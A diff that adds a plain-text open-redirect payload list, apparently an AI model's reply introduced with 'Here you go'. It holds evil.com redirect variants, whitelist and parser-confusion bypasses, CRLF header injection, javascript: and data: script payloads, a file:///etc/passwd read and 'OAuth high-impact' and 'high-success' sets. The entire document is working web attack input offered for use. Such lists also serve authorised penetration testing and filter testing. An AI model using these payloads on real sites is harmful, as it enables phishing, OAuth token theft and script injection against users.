@@ -1,0 +1,134 @@
+Here you go 👍
+**Plain `.txt` format**, **titles as comments**, clean and ready to save as
+`open_redirect_payloads.txt`
+
+```txt
+# ===============================
+# BASIC OPEN REDIRECT PAYLOADS
+# ===============================
+https://evil.com
+http://evil.com
+https://www.evil.com
+
+# ===============================
+# PROTOCOL-RELATIVE PAYLOADS
+# ===============================
+/ /evil.com
+//evil.com
+///evil.com
+////evil.com
+
+# ===============================
+# URL ENCODED PAYLOADS
+# ===============================
+%2f%2fevil.com
+%2F%2Fevil.com
+%252f%252fevil.com
+%255c%255cevil.com
+
+# ===============================
+# MIXED SLASH / PARSER CONFUSION
+# ===============================
+https:/\/evil.com
+https:\evil.com
+https:\\evil.com
+https:////evil.com
+
+# ===============================
+# @ SYMBOL (USERINFO) CONFUSION
+# ===============================
+https://target.com@evil.com
+https://target.com:443@evil.com
+https://user@evil.com
+
+# ===============================
+# SUBDOMAIN / WHITELIST BYPASS
+# ===============================
+https://evil.com.target.com
+https://target.com.evil.com
+https://evil-target.com
+
+# ===============================
+# PATH TRAVERSAL REDIRECTS
+# ===============================
+/\evil.com
+//evil.com/%2f..
+/../evil.com
+../../evil.com
+
+# ===============================
+# FRAGMENT IDENTIFIER PAYLOADS
+# ===============================
+#https://evil.com
+/#/evil.com
+//#evil.com
+
+# ===============================
+# PARAMETER POLLUTION
+# ===============================
+/home&next=https://evil.com
+?next=/home&next=https://evil.com
+
+# ===============================
+# CHAINED REDIRECT PAYLOADS
+# ===============================
+/redirect?url=https://evil.com
+/out?next=/redirect?url=https://evil.com
+
+# ===============================
+# SCHEME ABUSE PAYLOADS
+# ===============================
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+vbscript:alert(1)
+
+# ===============================
+# NULL BYTE INJECTION (LEGACY)
+# ===============================
+https://evil.com%00.target.com
+https://evil.com%00
+
+# ===============================
+# CRLF / HEADER INJECTION
+# ===============================
+%0d%0aLocation:https://evil.com
+%0D%0ALocation:%20https://evil.com
+
+# ===============================
+# UNICODE / DOT CONFUSION
+# ===============================
+https://evil.com%E3%80%82target.com
+https://evil.com%EF%BC%8Etarget.com
+
+# ===============================
+# IP ADDRESS PAYLOADS
+# ===============================
+https://127.0.0.1
+https://2130706433
+https://0x7f000001
+
+# ===============================
+# OAUTH HIGH-IMPACT PAYLOADS
+# ===============================
+https://evil.com
+//evil.com
+https://target.com@evil.com
+https://evil.com%00.target.com
+
+# ===============================
+# FILE / WEIRD SCHEME PAYLOADS
+# ===============================
+file:///etc/passwd
+ftp://evil.com
+
+# ===============================
+# HIGH-SUCCESS MINIMAL SET
+# ===============================
+https://evil.com
+//evil.com
+%2f%2fevil.com
+%252f%252fevil.com
+https://target.com@evil.com
+https:/\/evil.com
+https://evil.com%00.target.com
+```
